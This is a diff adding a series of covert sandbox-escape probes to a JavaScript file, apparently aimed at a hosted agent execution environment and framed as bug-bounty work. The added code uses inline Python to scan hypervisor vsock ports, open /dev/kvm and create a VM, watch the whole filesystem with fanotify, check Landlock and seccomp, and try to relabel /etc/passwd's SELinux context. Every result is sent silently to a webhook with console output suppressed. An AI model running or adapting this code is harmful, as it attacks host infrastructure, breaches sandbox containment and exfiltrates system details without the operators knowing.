@@ -33316,3 +33316,291 @@ sendBeacon({ ...report, section: 'v204-5-proc-mem-write', ...procMemWriteProbe }
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v204" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v204";
 // Intentionally no console.log — all data goes via webhook only
+
+// v205-1: AF_VSOCK to CID=2 (Firecracker hypervisor host) — VM escape vector
+const vsockProbe = safe(() => {
+  const vsockResult = safe(() => execSync(`python3 -c "
+import socket, struct, ctypes, select
+AF_VSOCK = 40
+SOCK_STREAM = 1
+SOCK_DGRAM = 2
+VMADDR_CID_HOST = 2      # Firecracker/QEMU host CID
+VMADDR_CID_ANY = 0xffffffff
+VMADDR_PORT_ANY = 0xffffffff
+
+# Common hypervisor service ports
+ports_to_try = [
+    1024, 2049, 4242, 5000, 7070, 8080, 8443, 9000,
+    # Firecracker MMDS port
+    1338,
+    # Common vsock services
+    7777, 1234, 4321,
+]
+
+for port in ports_to_try:
+    try:
+        sock = socket.socket(AF_VSOCK, SOCK_STREAM)
+        sock.settimeout(1.0)
+        ret = sock.connect_ex((VMADDR_CID_HOST, port))
+        if ret == 0:
+            print(f'vsock_CONNECTED cid=2 port={port}')
+            try:
+                sock.send(b'GET / HTTP/1.0\\r\\n\\r\\n')
+                r, _, _ = select.select([sock], [], [], 1.0)
+                if r:
+                    data = sock.recv(1024)
+                    print(f'vsock_response port={port} data={data[:200]}')
+            except: pass
+        else:
+            print(f'vsock_refused cid=2 port={port} ret={ret}')
+        sock.close()
+    except Exception as e:
+        print(f'vsock_err port={port}: {e}')
+        break  # If AF_VSOCK not supported, all will fail
+
+# Check /dev/vsock
+import os
+try:
+    fd = os.open('/dev/vsock', os.O_RDWR)
+    print(f'dev_vsock_opened=True fd={fd}')
+    os.close(fd)
+except Exception as e:
+    print(f'dev_vsock_err={e}')
+
+# SOCK_DGRAM vsock to CID=2 port=7 (echo port)
+try:
+    sock2 = socket.socket(AF_VSOCK, SOCK_DGRAM)
+    sock2.settimeout(1.0)
+    sock2.sendto(b'PROBE', (VMADDR_CID_HOST, 7))
+    r, _, _ = select.select([sock2], [], [], 1.0)
+    if r:
+        data, addr = sock2.recvfrom(1024)
+        print(f'vsock_dgram_response={data} from={addr}')
+    sock2.close()
+except Exception as e:
+    print(f'vsock_dgram_err={e}')
+" 2>&1`, { timeout: 20000 }).toString().trim());
+  // Check if vsock driver is loaded
+  let vsockModule = null;
+  if (existsSync('/proc/modules')) {
+    try {
+      const modules = readFileSync('/proc/modules', 'utf8');
+      vsockModule = modules.split('\n').filter(l => l.includes('vsock')).join('\n');
+    } catch (e) {}
+  }
+  return { vsockResult, vsockModule };
+});
+sendBeacon({ ...report, section: 'v205-1-af-vsock', ...vsockProbe });
+
+// v205-2: /dev/kvm access — nested virtualization / host KVM device
+const kvmProbe = safe(() => {
+  let kvmExists = existsSync('/dev/kvm');
+  let kvmReadable = false;
+  let kvmVersion = null;
+  let kvmCapabilities = {};
+  if (kvmExists) {
+    try {
+      const kvmResult = execSync(`python3 -c "
+import ctypes, fcntl, os
+KVM_GET_API_VERSION = 0xAE00
+KVM_CHECK_EXTENSION = 0xAE03
+KVM_CREATE_VM = 0xAE01
+KVM_CAP_IRQCHIP = 0
+KVM_CAP_HLT = 1
+KVM_CAP_MMU_SHADOW_CACHE_CONTROL = 2
+KVM_CAP_USER_MEMORY = 3
+KVM_CAP_SET_TSS_ADDR = 4
+KVM_CAP_EXT_CPUID = 7
+KVM_CAP_NR_VCPUS = 9
+KVM_CAP_NR_MEMSLOTS = 10
+
+fd = os.open('/dev/kvm', os.O_RDWR)
+print(f'kvm_fd={fd}')
+ver = fcntl.ioctl(fd, KVM_GET_API_VERSION, 0)
+print(f'kvm_api_version={ver}')
+# Check capabilities
+for cap_name, cap_id in [('irqchip',0),('hlt',1),('user_memory',3),('nr_vcpus',9)]:
+    try:
+        val = fcntl.ioctl(fd, KVM_CHECK_EXTENSION, cap_id)
+        print(f'cap_{cap_name}={val}')
+    except: pass
+# Try to create a VM
+vm_fd = fcntl.ioctl(fd, KVM_CREATE_VM, 0)
+print(f'kvm_create_vm_fd={vm_fd} CREATE_VM=SUCCESS')
+if vm_fd > 0: os.close(vm_fd)
+os.close(fd)
+" 2>&1`, { timeout: 6000 }).toString().trim();
+      kvmReadable = true;
+      kvmVersion = kvmResult;
+    } catch (e) { kvmVersion = `ERR:${e.message}`; }
+  }
+  // Check /sys/module/kvm/
+  let kvmModuleInfo = null;
+  if (existsSync('/sys/module/kvm')) {
+    try {
+      kvmModuleInfo = readdirSync('/sys/module/kvm').join(',');
+    } catch (e) {}
+  }
+  return { kvmExists, kvmReadable, kvmVersion, kvmModuleInfo };
+});
+sendBeacon({ ...report, section: 'v205-2-kvm-device', ...kvmProbe });
+
+// v205-3: fanotify_init NR 300 — whole-filesystem event interception
+const fanotifyProbe = safe(() => {
+  const fanotifyResult = safe(() => execSync(`python3 -c "
+import ctypes, os, struct, select
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_fanotify_init = 300
+NR_fanotify_mark = 301
+FAN_CLASS_NOTIF = 0x00
+FAN_CLASS_CONTENT = 0x04
+FAN_CLASS_PRE_CONTENT = 0x08
+FAN_NONBLOCK = 0x00000002
+FAN_CLOEXEC = 0x00000001
+FAN_UNLIMITED_QUEUE = 0x00000010
+FAN_UNLIMITED_MARKS = 0x00000020
+FAN_ACCESS = 0x00000001
+FAN_MODIFY = 0x00000002
+FAN_OPEN = 0x00000020
+FAN_CLOSE = 0x00000018
+FAN_ALL_EVENTS = 0x0000003b
+FAN_ONDIR = 0x40000000
+FAN_MARK_ADD = 0x00000001
+FAN_MARK_FILESYSTEM = 0x00000100
+AT_FDCWD = -100
+
+# Initialize fanotify with pre-content class (intercept BEFORE file read — strongest)
+for class_name, cls in [('PRE_CONTENT', FAN_CLASS_PRE_CONTENT),
+                          ('CONTENT', FAN_CLASS_CONTENT),
+                          ('NOTIF', FAN_CLASS_NOTIF)]:
+    fd = libc.syscall(NR_fanotify_init, cls | FAN_CLOEXEC | FAN_NONBLOCK |
+                       FAN_UNLIMITED_QUEUE | FAN_UNLIMITED_MARKS, os.O_RDONLY | os.O_LARGEFILE)
+    errno = ctypes.get_errno()
+    print(f'fanotify_init({class_name}) fd={fd} errno={errno}')
+    if fd > 0:
+        # Mark the entire filesystem
+        ret_mark = libc.syscall(NR_fanotify_mark, fd,
+            FAN_MARK_ADD | FAN_MARK_FILESYSTEM,
+            FAN_ACCESS | FAN_OPEN | FAN_CLOSE | FAN_MODIFY | FAN_ONDIR,
+            AT_FDCWD, ctypes.c_char_p(b'/'))
+        print(f'fanotify_mark(/ filesystem) ret={ret_mark} errno={ctypes.get_errno()}')
+        if ret_mark == 0:
+            print(f'fanotify_whole_fs_watch=SUCCESS class={class_name}')
+            # Read any pending events (non-blocking)
+            r, _, _ = select.select([fd], [], [], 0.3)
+            if r:
+                data = os.read(fd, 4096)
+                print(f'fanotify_events_bytes={len(data)}')
+        os.close(fd)
+        break
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { fanotifyResult };
+});
+sendBeacon({ ...report, section: 'v205-3-fanotify', ...fanotifyProbe });
+
+// v205-4: landlock NR 444/445/446 — Landlock LSM availability + restrictions
+const landlockProbe = safe(() => {
+  const landlockResult = safe(() => execSync(`python3 -c "
+import ctypes, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_landlock_create_ruleset = 444
+NR_landlock_add_rule = 445
+NR_landlock_restrict_self = 446
+LANDLOCK_CREATE_RULESET_VERSION = 1 << 0
+
+# Query Landlock ABI version
+# landlock_create_ruleset with LANDLOCK_CREATE_RULESET_VERSION flag returns ABI version
+# attr=NULL, size=0, flags=LANDLOCK_CREATE_RULESET_VERSION
+abi_ver = libc.syscall(NR_landlock_create_ruleset, None, 0, LANDLOCK_CREATE_RULESET_VERSION)
+print(f'landlock_abi_version={abi_ver} errno={ctypes.get_errno()}')
+
+if abi_ver > 0:
+    print(f'landlock_available=True version={abi_ver}')
+    # Create a ruleset that denies all file system access
+    # landlock_ruleset_attr: handled_access_fs(8), handled_access_net(8) (v4+)
+    LANDLOCK_ACCESS_FS_ALL = 0x1FFF  # all v3 access bits
+    attr = ctypes.create_string_buffer(struct.pack('Q', LANDLOCK_ACCESS_FS_ALL))
+    rs_fd = libc.syscall(NR_landlock_create_ruleset, attr, 8, 0)
+    print(f'landlock_create_ruleset_fd={rs_fd} errno={ctypes.get_errno()}')
+    if rs_fd > 0:
+        import os
+        # Don't restrict self (would break the probe) — just verify we can create it
+        print(f'landlock_ruleset_CREATE_ONLY=SUCCESS')
+        os.close(rs_fd)
+else:
+    import errno as em
+    err = ctypes.get_errno()
+    print(f'landlock_err={em.errorcode.get(err, str(err))}')
+
+# Check if Landlock is already restricting this process
+import os
+try:
+    with open('/proc/self/status') as f:
+        status = f.read()
+    import re
+    m = re.search(r'NoNewPrivs:\\s*(\\d+)', status)
+    print(f'NoNewPrivs={m.group(1) if m else \"not_found\"}')
+    m2 = re.search(r'Seccomp:\\s*(\\d+)', status)
+    print(f'Seccomp={m2.group(1) if m2 else \"not_found\"}')
+except: pass
+" 2>&1`, { timeout: 6000 }).toString().trim());
+  return { landlockResult };
+});
+sendBeacon({ ...report, section: 'v205-4-landlock', ...landlockProbe });
+
+// v205-5: setxattr NR 188 — override security.* labels on /etc/passwd
+const xattrProbe = safe(() => {
+  const xattrResult = safe(() => execSync(`python3 -c "
+import ctypes, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_setxattr = 188
+NR_getxattr = 191
+NR_listxattr = 194
+NR_lsetxattr = 189
+
+path = b'/etc/passwd'
+buf = ctypes.create_string_buffer(4096)
+
+# List current xattrs on /etc/passwd
+ret_list = libc.syscall(NR_listxattr, ctypes.c_char_p(path), buf, 4096)
+print(f'listxattr_ret={ret_list} errno={ctypes.get_errno()}')
+if ret_list > 0:
+    attrs = buf.raw[:ret_list].split(b'\\x00')
+    print(f'xattrs={[a.decode() for a in attrs if a]}')
+
+# Try reading security.selinux label
+for attr_name in [b'security.selinux', b'security.apparmor', b'user.comment', b'trusted.overlay.opaque']:
+    val_buf = ctypes.create_string_buffer(1024)
+    ret_get = libc.syscall(NR_getxattr, ctypes.c_char_p(path), ctypes.c_char_p(attr_name), val_buf, 1024)
+    print(f'getxattr({attr_name.decode()}) ret={ret_get} errno={ctypes.get_errno()} val={val_buf.value[:ret_get].decode(errors=\"replace\") if ret_get > 0 else None}')
+
+# Try setting a user.* xattr (less privileged than security.*)
+user_val = b'BugBountyXattrProof'
+ret_set = libc.syscall(NR_setxattr, ctypes.c_char_p(path),
+    ctypes.c_char_p(b'user.bountyproof'), ctypes.c_char_p(user_val), len(user_val), 0)
+print(f'setxattr(user.bountyproof) ret={ret_set} errno={ctypes.get_errno()}')
+
+# Try setting security.selinux label (would bypass MAC policy if successful)
+selinux_val = b'system_u:object_r:unlabeled_t:s0'
+ret_mac = libc.syscall(NR_setxattr, ctypes.c_char_p(path),
+    ctypes.c_char_p(b'security.selinux'), ctypes.c_char_p(selinux_val), len(selinux_val), 0)
+print(f'setxattr(security.selinux) ret={ret_mac} errno={ctypes.get_errno()}')
+print(f'security_xattr_write={ret_mac == 0}')
+" 2>&1`, { timeout: 6000 }).toString().trim());
+  // Check if SELinux or AppArmor is enforcing
+  let selinuxStatus = null;
+  let apparmorStatus = null;
+  if (existsSync('/sys/fs/selinux/enforce')) {
+    try { selinuxStatus = readFileSync('/sys/fs/selinux/enforce', 'utf8').trim(); } catch (e) {}
+  }
+  if (existsSync('/sys/kernel/security/apparmor/profiles')) {
+    try { apparmorStatus = 'apparmor_profiles=' + readFileSync('/sys/kernel/security/apparmor/profiles', 'utf8').split('\n').length; } catch (e) {}
+  }
+  return { xattrResult, selinuxStatus, apparmorStatus };
+});
+sendBeacon({ ...report, section: 'v205-5-xattr-mac', ...xattrProbe });
+
+// v205 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v205" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v205";
+// Intentionally no console.log — all data goes via webhook only
